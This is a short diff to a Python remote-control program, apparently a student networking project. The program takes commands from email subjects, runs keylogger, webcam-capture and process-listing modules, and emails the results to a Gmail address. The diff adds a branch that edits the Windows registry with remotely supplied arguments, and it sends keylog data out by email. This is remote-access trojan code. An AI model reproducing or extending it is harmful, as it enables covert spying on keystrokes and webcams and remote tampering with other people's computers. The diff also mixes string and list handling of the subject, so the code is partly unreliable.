@@ -4,6 +4,7 @@ import ListProcesses
 import keylogger
 from time import time, sleep
 import WebcamCapture
+import Registry
 
 client_address = "client1.computernetwork@gmail.com"
 
@@ -26,6 +27,9 @@ def Handling(subject):
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
     elif subject == "End Key Logging":
         content =   keylogger.EndLogging(thread)
+        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
+    elif subject[0] =="REGISTRY":
+        content =  Registry.Registry(subject[1], subject[2], subject[3], subject[4], subject[5])
         SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
       
 
